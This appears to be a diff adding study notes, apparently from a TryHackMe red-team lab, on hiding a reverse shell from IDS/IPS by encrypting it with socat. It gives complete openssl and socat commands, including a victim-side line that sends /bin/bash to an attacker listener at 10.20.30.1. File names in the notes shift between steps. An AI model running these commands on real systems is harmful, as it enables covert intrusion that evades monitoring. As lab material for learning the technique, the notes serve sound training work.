@@ -1,0 +1,47 @@
+Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
+
+One direct approach is to create the necessary encryption key on the attacker’s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
+
+1) Create the key
+2) Listen on the attacker’s machine
+3) Connect to the attacker’s machine from victim's machine
+
+Firstly, we can create the key using openssl with:
+
+$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+
+The arguments in the above command are:
+
+req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
+// -x509 specifies that we want an X.509 certificate
+// -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can //  use other options for RSA key size, such as -newkey rsa:2048.)
+// -days 365 shows that the validity of our certificate will be one year
+// -subj sets data, such as organization and country, via the command-line.
+// -nodes simplifies our command and does not encrypt the private key
+// -keyout PRIVATE_KEY specifies the filename where we want to save our private key
+// -out CERTIFICATE specifies the filename to which we want to write the certificate request
+
+And the above command will give us two outputs:
+1) Private key: ourfile.key
+2) Certificate: ourfile.crt
+
+Then We need to create our .pem (Privacy Enhanced Mail) where it is the concatenation of both the .key & .crt files
+
+$ cat ourfile.key ourfile.cert > ourconcatenatedfile.pem
+
+Secondly we need to set socat to listen on our specific port && encrypt traffic
+
+$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+
+breakdown of socat above:
+// -d -d provides some debugging data (fatal, error, warning, and notice messages)
+// OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
+// cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
+// verify=0 disables checking peer’s certificate
+// fork creates a sub-process to handle each new connection.
+
+Thirdly, on the victim system, connect to the listening session on the attacker machine using:
+
+$ socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
+
+Note that the EXEC invokes the specified program.
